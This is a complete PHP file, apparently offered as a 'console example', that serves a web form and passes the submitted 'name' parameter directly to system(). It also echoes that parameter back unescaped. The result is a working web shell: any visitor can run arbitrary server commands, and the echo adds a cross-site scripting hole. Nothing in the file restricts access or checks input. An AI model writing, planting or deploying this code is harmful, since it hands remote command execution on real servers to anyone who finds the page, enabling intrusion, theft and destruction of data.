<?php
          header( "Content-Type: text/html");
          print "
          <html>
          <head>
          <title>ejemplo de consola</title>
          </head>
          <body>

   ";

  if (isset($_REQUEST["name"])){
          $name=$_REQUEST["name"];
          echo $name."<br>";
		  system("$name");
  } 
          print "
          <br>
          <form method=\"POST\" action=\"$_SERVER[PHP_SELF]\">
          <table>
          <tr>
          <td>$</td><td> <input type=\"text\" name=\"name\" size=30></td>
          </table>
          <input type=\"submit\" value=\"Submit\"></form>
          <br><hr>
          ";
  
  print "</body>";
  print "</html>";
?>